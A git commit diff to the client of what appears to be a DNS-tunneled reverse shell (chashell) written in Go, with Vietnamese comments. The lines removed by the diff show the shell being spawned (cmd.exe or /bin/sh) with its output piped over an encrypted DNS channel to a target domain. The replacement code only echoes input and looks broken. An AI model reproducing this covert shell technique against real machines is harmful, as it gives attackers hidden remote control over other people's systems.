3ad7f22ad40eb5700fa8b2c60c6c2f1089012e5c
Hồ Duy Quốc Bảo <hoduyquocbao@gmail.com>
2021-09-17 10:48:29 +0700

    up

--- cmd/client/chashell.go
+++ cmd/client/chashell.go
@@ -5,8 +5,6 @@ import (
 	"fmt"
 	"ipwf/lib/transport"
 	"os"
-	"os/exec"
-	"runtime"
 )
 
 // khởi tạo 2 mảng chứa tên miền và encryptionKey
@@ -17,29 +15,42 @@ var (
 
 func main() {
 	// khởi tạo cmd bằng exec.Cmd của hệ thống
-	var cmd *exec.Cmd
+	// var cmd *exec.Cmd
 
-	// // kiểm tra nếu bằng window thì sử dụng cmd.exe
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd.exe")
-	} else {
-		// nếu khác window thì sử dụng mặc định của unix
-		cmd = exec.Command("/bin/sh", "-c", "/bin/sh")
-	}
+	// // // kiểm tra nếu bằng window thì sử dụng cmd.exe
+	// if runtime.GOOS == "windows" {
+	// 	cmd = exec.Command("cmd.exe")
+	// } else {
+	// 	// nếu khác window thì sử dụng mặc định của unix
+	// 	cmd = exec.Command("/bin/sh", "-c", "/bin/sh")
+	// }
 
 	// khởi tạo dnsTransport bằng dữ liệu đã gói của DNSStream
 	dnsTransport := transport.DNSStream(targetDomain, encryptionKey)
 
 	// // gán cho cmd.Stdout bằng dữ liệu của dnsTransport
-	cmd.Stdout = dnsTransport
+	// cmd.Stdout = dnsTransport
 
 	// // gán cho cmd.Stderr bằng dữ liệu của dnsTransport
-	cmd.Stderr = dnsTransport
+	// cmd.Stderr = dnsTransport
 
 	// // gán cho cmd.Stdin bằng dữ liệu của dnsTransport
 	// cmd.Stdin = dnsTransport
-	cmd.Stdin = bufio.NewReader(os.Stdin)
-	scanner := bufio.NewScanner(dnsTransport)
+	// cmd.Stdin = bufio.NewReader(os.Stdin)
+
+	scanners := bufio.NewScanner(dnsTransport)
+	// scanner.Text() = dnsTransport
+	for scanners.Scan() {
+		fmt.Println(scanners.Text())
+	}
+
+	if scanners.Err() != nil {
+		// Handle error.
+		fmt.Println(scanners.Err())
+
+	}
+
+	scanner := bufio.NewScanner(os.Stdin)
 	// scanner.Text() = dnsTransport
 	for scanner.Scan() {
 		fmt.Println(scanner.Text())
@@ -54,7 +65,7 @@ func main() {
 	// // hiển thị dnsTransport để kiểm xoát thêm
 
 	// //	khởi tạo err bằng cách chạy cmd.Run()
-	err := cmd.Run()
+	// err := cmd.Run()
 
 	// // nếu có lỗi sẽ trả về
 	if err != nil {
